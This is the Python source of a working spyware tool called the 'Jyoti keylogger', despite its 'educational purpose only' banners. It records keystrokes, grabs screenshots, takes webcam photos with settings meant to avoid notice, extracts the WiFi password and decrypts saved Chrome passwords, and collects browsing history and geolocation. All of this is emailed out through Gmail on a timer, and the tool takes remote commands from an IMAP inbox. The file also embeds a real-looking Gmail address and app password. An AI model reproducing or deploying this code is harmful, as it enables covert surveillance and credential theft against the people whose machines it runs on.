try:
    import os
    import platform
    import smtplib
    import socket
    import threading
    import pyscreenshot
    import cv2
    from pynput.keyboard import Listener, Key
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    from email import encoders
    from email.mime.base import MIMEBase
    import time
    import imaplib
    import email
    from email.header import decode_header
    import urllib.request
    import json
    import uuid
    import subprocess
    import re
    import sqlite3
    import base64
    import shutil
    from Cryptodome.Cipher import AES
    import win32crypt
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot", "pynput", "opencv-python", "imap-tools", "pycryptodome", "pywin32"]
    call("pip install " + ' '.join(modules), shell=True)

finally:
    EMAIL_ADDRESS = "imontasirrahman@gmail.com"
    EMAIL_PASSWORD = "zjmg yzup rgic gglk"
    SEND_REPORT_EVERY = 300  # 5 minutes for automatic reports
    CHECK_COMMANDS_EVERY = 10  # Check for commands every 10 seconds

    class KeyLogger:
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = "KeyLogger Started...\n"
            self.email = email
            self.password = password
            self.last_report_time = time.time()
            self.last_command_check = time.time()
            self.is_running = True
            self.keyboard_listener = None
            self.report_timer = None
            self.first_report_sent = False
            self.processed_emails = set()

        def appendlog(self, string):
            print(f"Logging: {repr(string)}")
            self.log += string

        def save_data(self, key):
            if not self.is_running:
                return
                
            try:
                current_key = str(key.char)
                self.appendlog(current_key)
            except AttributeError:
                if key == Key.space:
                    self.appendlog(" ")
                elif key == Key.enter:
                    self.appendlog("\n[ENTER]\n")
                elif key == Key.tab:
                    self.appendlog("[TAB]")
                elif key == Key.backspace:
                    self.appendlog("[BACKSPACE]")
                elif key == Key.esc:
                    self.appendlog("[ESC]")
                else:
                    key_str = str(key).replace("Key.", "")
                    if len(key_str) == 1 or key_str in ["'", '"', "`", "~", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "-", "_", "=", "+", "[", "]", "{", "}", "|", "\\", ";", ":", "'", '"', ",", "<", ".", ">", "/", "?"]:
                        self.appendlog(key_str)

        def create_keystroke_file(self):
            """Create a text file with keystrokes and return filename"""
            try:
                filename = f"keystrokes_{int(time.time())}.txt"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(self.log)
                print(f"Keystrokes saved to: {filename}")
                return filename
            except Exception as e:
                print(f"Failed to create keystroke file: {e}")
                return None

        def send_mail(self, email, password, message, subject="Keylogger Report", attachments=None):
            if attachments is None:
                attachments = []
                
            msg = MIMEMultipart()
            msg['From'] = email
            msg['To'] = email
            msg['Subject'] = subject
            
            body = f"{message}"
            msg.attach(MIMEText(body, 'plain'))
            
            for filepath in attachments:
                if os.path.exists(filepath):
                    with open(filepath, "rb") as attachment:
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(attachment.read())
                    
                    encoders.encode_base64(part)
                    part.add_header('Content-Disposition', f'attachment; filename= {os.path.basename(filepath)}')
                    msg.attach(part)
            
            try:
                server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
                server.login(email, password)
                server.sendmail(email, email, msg.as_string())
                server.quit()
                print(f"✓ Email sent: {subject}")
                return True
            except Exception as e:
                print(f"✗ Failed to send email: {str(e)}")
                return False

        def take_screenshot(self):
            """Take screenshot and return filename"""
            try:
                filename = f"screenshot_{int(time.time())}.png"
                img = pyscreenshot.grab()
                img.save(filename)
                print(f"✓ Screenshot taken: {filename}")
                return filename
            except Exception as e:
                print(f"✗ Screenshot failed: {e}")
                return None

        def take_camera_photo(self):
            """Take photo from camera WITHOUT light - SILENT MODE"""
            try:
                filename = f"camera_{int(time.time())}.jpg"
                cap = cv2.VideoCapture(0)
                
                if not cap.isOpened():
                    print("✗ Camera not accessible")
                    return None
                
                # SILENT MODE - No light, no focus, quick capture
                cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
                cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
                cap.set(cv2.CAP_PROP_AUTOFOCUS, 0)  # Turn off autofocus (no focus light)
                cap.set(cv2.CAP_PROP_AUTO_EXPOSURE, 0.25)  # Manual exposure
                cap.set(cv2.CAP_PROP_EXPOSURE, -6)  # Low exposure (darker image but no light)
                
                # Quick capture - no delay
                ret, frame = cap.read()
                if ret:
                    # Save the image
                    cv2.imwrite(filename, frame)
                    print(f"✓ Camera photo taken (SILENT MODE - no light): {filename}")
                else:
                    print("✗ Failed to capture from camera")
                    filename = None
                
                cap.release()
                return filename
                
            except Exception as e:
                print(f"✗ Camera capture failed: {e}")
                return None

        def get_mac_address(self):
            """Get MAC address for system identification"""
            try:
                mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                               for elements in range(0,2*6,2)][::-1])
                return mac
            except:
                return "Unknown"

        def get_connected_wifi_password(self):
            """Get password for currently connected WiFi only"""
            try:
                print("🔓 Extracting connected WiFi password...")
                wifi_data = ""
                
                if platform.system() == "Windows":
                    # Get currently connected WiFi
                    result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], 
                                          capture_output=True, text=True, timeout=10)
                    
                    connected_ssid = "Not connected"
                    signal = "Unknown"
                    bssid = "Unknown"
                    radio = "Unknown"
                    
                    for line in result.stdout.split('\n'):
                        if "SSID" in line and "BSSID" not in line:
                            connected_ssid = line.split(":")[1].strip()
                        elif "Signal" in line:
                            signal = line.split(":")[1].strip()
                        elif "BSSID" in line:
                            bssid = line.split(":")[1].strip()
                        elif "Radio type" in line:
                            radio = line.split(":")[1].strip()
                    
                    wifi_data += f"📶 **CURRENTLY CONNECTED WIFI:**\n"
                    wifi_data += f"• Network Name: {connected_ssid}\n"
                    wifi_data += f"• Signal Strength: {signal}\n"
                    wifi_data += f"• BSSID: {bssid}\n"
                    wifi_data += f"• Radio Type: {radio}\n"
                    
                    # Get password for connected network only
                    if connected_ssid != "Not connected":
                        try:
                            cmd = ['netsh', 'wlan', 'show', 'profile', connected_ssid, 'key=clear']
                            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                            
                            password = "Not Found"
                            security = "Unknown"
                            
                            for line in result.stdout.split('\n'):
                                if "Key Content" in line:
                                    password = line.split(":")[1].strip()
                                elif "Authentication" in line:
                                    security = line.split(":")[1].strip()
                            
                            wifi_data += f"• Password: {password}\n"
                            wifi_data += f"• Security: {security}\n\n"
                        except Exception as e:
                            wifi_data += f"• Password: Error extracting\n"
                            wifi_data += f"• Security: Unknown\n\n"
                    else:
                        wifi_data += f"• Password: Not connected to WiFi\n\n"
                
                else:
                    wifi_data = "❌ WiFi password extraction only works on Windows\n"
                
                print("✅ Connected WiFi password extracted")
                return wifi_data
                
            except Exception as e:
                error_msg = f"❌ WiFi password extraction failed: {str(e)}"
                print(error_msg)
                return error_msg

        def get_chrome_passwords(self):
            """Extract saved passwords from Google Chrome and save to file"""
            try:
                print("🌐 Extracting Chrome passwords...")
                
                # Chrome password database location
                chrome_path = os.path.join(os.environ['USERPROFILE'], 
                                         'AppData', 'Local', 'Google', 'Chrome', 
                                         'User Data', 'Default', 'Login Data')
                
                if not os.path.exists(chrome_path):
                    return "❌ Chrome password database not found\n", None
                
                # Copy the database to avoid locking issues
                temp_db = "chrome_temp.db"
                shutil.copy2(chrome_path, temp_db)
                
                # Connect to the database
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                # Query the logins table
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                logins = cursor.fetchall()
                
                # Create password file
                password_filename = f"chrome_passwords_{int(time.time())}.txt"
                with open(password_filename, 'w', encoding='utf-8') as f:
                    f.write("🔐 **CHROME SAVED PASSWORDS:**\n")
                    f.write(f"• Total saved logins: {len(logins)}\n\n")
                    
                    if logins:
                        for login in logins:
                            url = login[0]
                            username = login[1] if login[1] else "No username"
                            encrypted_password = login[2]
                            
                            # Decrypt the password
                            try:
                                if encrypted_password:
                                    # Get encryption key from Chrome
                                    key = self.get_chrome_encryption_key()
                                    if key:
                                        # Decrypt the password
                                        decrypted_password = self.decrypt_password(encrypted_password, key)
                                        password_display = decrypted_password
                                    else:
                                        password_display = "Encrypted (need master key)"
                                else:
                                    password_display = "No password"
                            except:
                                password_display = "Decryption failed"
                            
                            f.write(f"🔹 **Website:** {url}\n")
                            f.write(f"   • Username: {username}\n")
                            f.write(f"   • Password: {password_display}\n\n")
                
                conn.close()
                os.remove(temp_db)
                
                summary = f"✅ Chrome passwords extracted - {len(logins)} logins found\n"
                print("✅ Chrome passwords extracted and saved to file")
                return summary, password_filename
                
            except Exception as e:
                error_msg = f"❌ Chrome password extraction failed: {str(e)}\n"
                print(error_msg)
                return error_msg, None

        def get_chrome_encryption_key(self):
            """Get Chrome's encryption key"""
            try:
                # Chrome local state file path
                local_state_path = os.path.join(os.environ['USERPROFILE'],
                                              'AppData', 'Local', 'Google', 'Chrome',
                                              'User Data', 'Local State')
                
                with open(local_state_path, "r", encoding="utf-8") as f:
                    local_state = json.loads(f.read())
                
                # Get encrypted key from local state
                encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
                
                # Decrypt the key using DPAPI
                decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                
                return decrypted_key
            except:
                return None

        def decrypt_password(self, encrypted_password, key):
            """Decrypt Chrome password using AES"""
            try:
                # Extract the initialization vector
                iv = encrypted_password[3:15]
                payload = encrypted_password[15:]
                
                # Create AES cipher
                cipher = AES.new(key, AES.MODE_GCM, iv)
                
                # Decrypt the password
                decrypted_pass = cipher.decrypt(payload)
                decrypted_pass = decrypted_pass[:-16].decode()  # Remove auth tag
                
                return decrypted_pass
            except:
                return "Decryption failed"

        def get_chrome_history(self):
            """Extract Chrome browsing history and save to file"""
            try:
                print("📚 Extracting Chrome history...")
                
                # Chrome history database location
                history_path = os.path.join(os.environ['USERPROFILE'],
                                          'AppData', 'Local', 'Google', 'Chrome',
                                          'User Data', 'Default', 'History')
                
                if not os.path.exists(history_path):
                    return "❌ Chrome history database not found\n", None
                
                # Copy the database
                temp_db = "history_temp.db"
                shutil.copy2(history_path, temp_db)
                
                # Connect to database
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                # Get browsing history
                cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
                history = cursor.fetchall()
                
                # Create history file
                history_filename = f"chrome_history_{int(time.time())}.txt"
                with open(history_filename, 'w', encoding='utf-8') as f:
                    f.write(f"🌐 **CHROME BROWSING HISTORY (Recent 50):**\n")
                    f.write(f"• Total history entries: {len(history)}\n\n")
                    
                    for entry in history:
                        url = entry[0]
                        title = entry[1] if entry[1] else "No title"
                        visit_count = entry[2]
                        
                        # Convert Chrome timestamp to readable format
                        try:
                            timestamp = entry[3] / 1000000 - 11644473600
                            visit_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))
                        except:
                            visit_time = "Unknown time"
                        
                        f.write(f"🔹 {visit_time}\n")
                        f.write(f"   • Title: {title}\n")
                        f.write(f"   • URL: {url}\n")
                        f.write(f"   • Visits: {visit_count}\n\n")
                
                conn.close()
                os.remove(temp_db)
                
                summary = f"✅ Chrome history extracted - {len(history)} entries found\n"
                print("✅ Chrome history extracted and saved to file")
                return summary, history_filename
                
            except Exception as e:
                error_msg = f"❌ Chrome history extraction failed: {str(e)}\n"
                print(error_msg)
                return error_msg, None

        def get_network_info(self):
            """Get comprehensive network information"""
            try:
                network_data = ""
                
                # Basic network info
                hostname = socket.gethostname()
                local_ip = socket.gethostbyname(hostname)
                mac_address = self.get_mac_address()
                
                network_data += "🌐 **NETWORK INFORMATION:**\n\n"
                network_data += "💻 **SYSTEM NETWORK:**\n"
                network_data += f"• Computer Name: {hostname}\n"
                network_data += f"• Local IP: {local_ip}\n"
                network_data += f"• MAC Address: {mac_address}\n"
                
                # Get public IP
                try:
                    with urllib.request.urlopen('https://api.ipify.org', timeout=10) as response:
                        public_ip = response.read().decode('utf-8').strip()
                    network_data += f"• Public IP: {public_ip}\n\n"
                except:
                    network_data += f"• Public IP: Unable to retrieve\n\n"
                
                return network_data
                
            except Exception as e:
                return f"❌ Network info error: {str(e)}\n"

        def get_location_info(self):
            """Get comprehensive location and credential information"""
            try:
                print("📍 Getting comprehensive system data...")
                
                location_data = "📍 **COMPREHENSIVE SYSTEM DATA**\n\n"
                location_data += "⚠️ **EDUCATIONAL PURPOSE ONLY**\n\n"
                
                # Add network information
                location_data += self.get_network_info()
                
                # Add connected WiFi password
                location_data += self.get_connected_wifi_password()
                
                # Add Chrome passwords summary (not full data)
                chrome_passwords_summary, chrome_passwords_file = self.get_chrome_passwords()
                location_data += chrome_passwords_summary
                
                # Add Chrome history summary (not full data)
                chrome_history_summary, chrome_history_file = self.get_chrome_history()
                location_data += chrome_history_summary
                
                # Get IP-based geolocation
                try:
                    with urllib.request.urlopen('https://api.ipify.org', timeout=10) as response:
                        public_ip = response.read().decode('utf-8').strip()
                    
                    if public_ip:
                        url = f"http://ip-api.com/json/{public_ip}"
                        with urllib.request.urlopen(url, timeout=10) as response:
                            ip_data = json.loads(response.read().decode('utf-8'))
                        
                        if ip_data.get('status') == 'success':
                            location_data += "🗺️ **IP GEOLOCATION (ISP LOCATION):**\n"
                            location_data += f"• Country: {ip_data.get('country', 'Unknown')}\n"
                            location_data += f"• Region: {ip_data.get('regionName', 'Unknown')}\n"
                            location_data += f"• City: {ip_data.get('city', 'Unknown')}\n"
                            location_data += f"• ISP: {ip_data.get('isp', 'Unknown')}\n"
                            location_data += f"• Coordinates: {ip_data.get('lat', 'Unknown')}, {ip_data.get('lon', 'Unknown')}\n"
                            
                            if ip_data.get('lat') and ip_data.get('lon'):
                                maps_link = f"https://www.google.com/maps?q={ip_data.get('lat')},{ip_data.get('lon')}"
                                location_data += f"• Google Maps: {maps_link}\n"
                            
                            location_data += f"• ⚠️ Note: This shows ISP location\n\n"
                except Exception as e:
                    location_data += f"• Geolocation: Unable to retrieve\n\n"
                
                # System information
                location_data += "💾 **SYSTEM INFORMATION:**\n"
                location_data += f"• OS: {platform.system()} {platform.release()}\n"
                location_data += f"• Username: {os.getlogin() if hasattr(os, 'getlogin') else 'Unknown'}\n"
                location_data += f"• Current Time: {time.ctime()}\n"

                print("✅ Comprehensive system data gathered")
                
                # Return both the summary data and file attachments
                attachments = []
                if chrome_passwords_file:
                    attachments.append(chrome_passwords_file)
                if chrome_history_file:
                    attachments.append(chrome_history_file)
                    
                return location_data, attachments
                
            except Exception as e:
                error_msg = f"❌ System data collection failed: {str(e)}"
                print(error_msg)
                return error_msg, []

        def send_location_only(self):
            """Send comprehensive system data"""
            print("📍 Getting comprehensive system data...")
            location_info, attachments = self.get_location_info()
            
            if location_info:
                print("📧 Sending comprehensive system data email...")
                success = self.send_mail(self.email, self.password, location_info, 
                             "Jyoti - Complete System Data", attachments)
                
                # Cleanup attachment files
                for file in attachments:
                    try:
                        os.remove(file)
                    except:
                        pass
                        
                if success:
                    print("✅ Complete system data sent successfully!")
                return success
            else:
                print("❌ Failed to get system data")
                self.send_mail(self.email, self.password, "Failed to get system data", 
                             "Jyoti - System Data Error")
            return False

        def send_screenshot_only(self):
            """Send only screenshot"""
            print("🖼️ Taking screenshot...")
            screenshot_file = self.take_screenshot()
            if screenshot_file:
                print("📧 Sending screenshot email...")
                success = self.send_mail(self.email, self.password, "Screenshot captured via", 
                             "Jyoti - Screenshot", [screenshot_file])
                os.remove(screenshot_file)
                if success:
                    print("✅ Screenshot sent successfully!")
                return success
            else:
                print("❌ Failed to take screenshot")
                self.send_mail(self.email, self.password, "Failed to capture screenshot", "Jyoti - Screenshot Error")
            return False

        def send_camera_only(self):
            """Send only camera photo"""
            print("📷 Taking camera photo...")
            camera_file = self.take_camera_photo()
            if camera_file:
                print("📧 Sending camera email...")
                success = self.send_mail(self.email, self.password, "Camera photo captured", 
                             "Jyoti - Camera Photo", [camera_file])
                os.remove(camera_file)
                if success:
                    print("✅ Camera photo sent successfully!")
                return success
            else:
                print("❌ Failed to take camera photo")
                self.send_mail(self.email, self.password, "Failed to capture camera photo", "Jyoti - Camera Error")
            return False

        def send_full_report(self, report_type="Automatic Report"):
            """Send complete report with all data"""
            attachments = []
            
            print(f"📊 Preparing {report_type}...")
            
            # Create keystroke file
            keystroke_file = self.create_keystroke_file()
            if keystroke_file:
                attachments.append(keystroke_file)
            
            # Take screenshot
            screenshot_file = self.take_screenshot()
            if screenshot_file:
                attachments.append(screenshot_file)
            
            # Take camera photo (SILENT MODE)
            camera_file = self.take_camera_photo()
            if camera_file:
                attachments.append(camera_file)
            
            # Get comprehensive system information with Chrome data as files
            location_info, chrome_attachments = self.get_location_info()
            attachments.extend(chrome_attachments)
            
            # Send email with all attachments and system info
            if attachments or location_info:
                subject = f"Jyoti - {report_type}"
                message = f"Report generated at {time.ctime()}\nFiles: {len(attachments)}\n\n"
                message += location_info
                
                success = self.send_mail(self.email, self.password, message, subject, attachments)
                self.log = "Continued logging...\n"
                if success:
                    print(f"✅ {report_type} sent with {len(attachments)} attachments + system data!")
                else:
                    print(f"❌ Failed to send {report_type}")
            
            # Cleanup files
            for file in attachments:
                try:
                    os.remove(file)
                except:
                    pass

        def check_commands(self):
            """Check for specific commands only - FIXED VERSION"""
            try:
                print("🔍 Checking for jyoti commands...")
                
                mail = imaplib.IMAP4_SSL("imap.gmail.com")
                mail.login(self.email, self.password)
                mail.select("inbox")

                # Search for ALL emails (both read and unread) to ensure we don't miss any
                status, messages = mail.search(None, 'ALL')
                email_ids = messages[0].split()

                if not email_ids:
                    print("📭 No emails found in inbox")
                    mail.close()
                    mail.logout()
                    return

                print(f"📩 Found {len(email_ids)} email(s) in inbox")

                # Process each email from newest to oldest
                for email_id in reversed(email_ids):
                    email_id_str = email_id.decode('utf-8')
                    
                    # Skip if already processed in this session
                    if email_id_str in self.processed_emails:
                        continue
                        
                    status, msg_data = mail.fetch(email_id, "(RFC822)")
                    if status != 'OK':
                        print(f"❌ Failed to fetch email: {email_id_str}")
                        continue

                    email_body = msg_data[0][1]
                    mail_message = email.message_from_bytes(email_body)
                    
                    # Get email subject
                    subject = ""
                    if mail_message["subject"]:
                        subject_raw = decode_header(mail_message["subject"])[0]
                        if subject_raw[0]:
                            subject = subject_raw[0] if isinstance(subject_raw[0], str) else subject_raw[0].decode()
                    
                    # Get email body
                    body = ""
                    if mail_message.is_multipart():
                        for part in mail_message.walk():
                            content_type = part.get_content_type()
                            content_disposition = str(part.get("Content-Disposition"))
                            if content_type == "text/plain" and "attachment" not in content_disposition:
                                try:
                                    body = part.get_payload(decode=True).decode('utf-8', errors='ignore')
                                    break
                                except:
                                    continue
                    else:
                        try:
                            body = mail_message.get_payload(decode=True).decode('utf-8', errors='ignore')
                        except:
                            body = ""

                    # Mark as processed in this session
                    self.processed_emails.add(email_id_str)
                    
                    # Clean and analyze the email content
                    if body:
                        body_clean = body.strip().lower()
                        subject_clean = subject.strip().lower()
                        
                        print(f"📨 Processing Email ID: {email_id_str}")
                        print(f"📧 Subject: '{subject_clean}'")
                        print(f"📝 Body: '{body_clean}'")
                        
                        # Combine subject and body for command detection
                        full_content = subject_clean + " " + body_clean
                        
                        # Process jyoti commands - check for commands in both subject and body
                        command_executed = False
                        
                        if "jyoti_lapi_screenshot" in full_content:
                            print("🎯 COMMAND DETECTED: jyoti_lapi_screenshot")
                            self.send_screenshot_only()
                            command_executed = True
                            
                        if "jyoti_picture" in full_content:
                            print("🎯 COMMAND DETECTED: jyoti_picture")
                            self.send_camera_only()
                            command_executed = True
                            
                        if "jyoti_report" in full_content:
                            print("🎯 COMMAND DETECTED: jyoti_report")
                            self.send_full_report("Manual Report")
                            command_executed = True
                            
                        if "jyoti_map" in full_content:
                            print("🎯 COMMAND DETECTED: jyoti_map")
                            self.send_location_only()
                            command_executed = True
                            
                        if command_executed:
                            print("✅ Command executed successfully!")
                            # Mark email as seen after successful command execution
                            try:
                                mail.store(email_id, '+FLAGS', '\\Seen')
                                print(f"✅ Marked email {email_id_str} as read")
                            except:
                                print(f"⚠️ Could not mark email {email_id_str} as read")
                        else:
                            print("❌ No valid jyoti command found")
                    else:
                        print("❌ Empty email body")

                mail.close()
                mail.logout()
                print("✅ Command check completed")
                
            except Exception as e:
                print(f"✗ Error checking commands: {e}")

        def automatic_operations(self):
            """Automatic reports - START + EVERY 5 MINUTES"""
            current_time = time.time()
            
            # FIRST REPORT when program starts
            if not self.first_report_sent:
                print("🚀 SENDING FIRST AUTOMATIC REPORT...")
                self.send_full_report("First Automatic Report")
                self.first_report_sent = True
                self.last_report_time = current_time
                print("✅ First report sent successfully!")
            
            # AUTOMATIC REPORTS every 5 minutes
            elif current_time - self.last_report_time >= SEND_REPORT_EVERY:
                if self.is_running:
                    print("⏰ SENDING SCHEDULED AUTOMATIC REPORT...")
                    self.send_full_report("Automatic Report")
                    self.last_report_time = current_time
                    print("✅ Scheduled report sent successfully!")

        def report(self):
            """Main reporting loop"""
            current_time = time.time()
            if current_time - self.last_command_check >= CHECK_COMMANDS_EVERY:
                self.check_commands()
                self.last_command_check = current_time

            self.automatic_operations()

            self.report_timer = threading.Timer(5, self.report)
            self.report_timer.daemon = True
            self.report_timer.start()

        def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            
            info = f"""
System Information:
Hostname: {hostname}
IP: {ip}
Processor: {plat}
System: {system}
Machine: {machine}

Captured Text:
"""
            self.appendlog(info)

        def run(self):
            self.system_information()
            self.report()
            
            print("=" * 60)
            print("🚀 JYOTI KEYLOGGER STARTED - EDUCATIONAL PURPOSE")
            print("=" * 60)
            print("📧 AUTOMATIC REPORTS:")
            print("  • IMMEDIATE: First report when starting")
            print("  • EVERY 5 MINUTES: Automatic full reports")
            print("")
            print("📧 MANUAL COMMANDS (send via email - subject or body):")
            print("  • jyoti_lapi_screenshot - Take screenshot")
            print("  • jyoti_picture - Take camera photo (SILENT - no light)")
            print("  • jyoti_report - Full report (all files + system data)")
            print("  • jyoti_map - Complete system data (WiFi + Chrome passwords)")
            print("")
            print("🔓 FEATURES:")
            print("  • Connected WiFi password extraction")
            print("  • Chrome saved passwords (saved as separate file)")
            print("  • Chrome browsing history (saved as separate file)")
            print("  • Network information")
            print("  • Keystroke logging")
            print("  • Screenshot capture")
            print("  • Camera access")
            print("")
            print("⚠️  FOR EDUCATIONAL AND AUTHORIZED USE ONLY")
            print("🔍 Command check: Every 10 seconds")
            print("⏰ Next auto report: 5 minutes")
            print("=" * 60)
            
            try:
                self.keyboard_listener = Listener(on_press=self.save_data)
                with self.keyboard_listener:
                    while True:
                        time.sleep(1)
            except KeyboardInterrupt:
                print("\n🛑 Keylogger stopped by user")
            except Exception as e:
                print(f"🛑 Keylogger stopped: {e}")
            finally:
                if self.report_timer:
                    self.report_timer.cancel()

    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()